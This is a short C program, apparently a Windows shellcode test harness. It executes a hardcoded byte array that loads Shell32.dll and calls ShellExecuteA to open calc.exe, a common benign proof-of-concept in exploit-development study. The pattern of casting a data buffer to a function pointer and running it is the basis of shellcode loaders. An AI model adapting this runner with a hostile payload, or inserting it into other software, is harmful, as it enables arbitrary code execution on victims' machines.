#include <Windows.h>
#include <stdio.h>

char code[] = {
        0xeb, 0x44, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0b,
        0x53, 0xb8, 0x00, 0x91,
        //0xbe, 0x77,
        0x2b, 0x77,
        0xff, 0xd0, 0xeb, 0x45, 0x5b, 0x33, 0xd2, 0x88,
        0x53, 0x0d, 0x53, 0x50, 0xb8, 0x30, 0x59, 
        //0xbe, 0x77,
        0x2b, 0x77,
        0xff, 0xd0, 0xeb, 0x47, 0x5b, 0x33, 0xd2, 0x88, 
        0x53, 0x08, 0xeb, 0x4d, 0x59, 0x33, 0xd2, 0x88,
        0x51, 0x04, 0x33, 0xd2, 0x6a, 0x05, 0x52, 0x52,
        0x53, 0x51, 0x52, 0xff, 0xd0, 0x33, 0xd2, 0x52, 
        0xb8, 0x80, 0xf3,
        //0xbe, 0x77,
        0x2b, 0x77,
        0xff, 0xd0, 0xe8, 0xb7, 0xff, 0xff, 0xff, 0x53,
        0x68, 0x65, 0x6c, 0x6c, 0x33, 0x32, 0x2e, 0x64,
        0x6c, 0x6c, 0x58, 0xe8, 0xb6, 0xff, 0xff, 0xff,
        0x53, 0x68, 0x65, 0x6c, 0x6c, 0x45, 0x78, 0x65,
        0x63, 0x75, 0x74, 0x65, 0x41, 0x58, 0xe8, 0xb4,
        0xff, 0xff, 0xff, 0x63, 0x61, 0x6c, 0x63, 0x2e,
        0x65, 0x78, 0x65, 0x58, 0xe8, 0xae, 0xff, 0xff,
        0xff, 0x6f, 0x70, 0x65, 0x6e, 0x58
    };


int main(int argc, char **argv) {
  int (*func)();             // function pointer
  func = (int (*)()) code;   // func points to our shellcode
  (int)(*func)();            // execute a function code[]
  // if our program returned 0 instead of 1, 
  // so our shellcode worked
  return 1;
}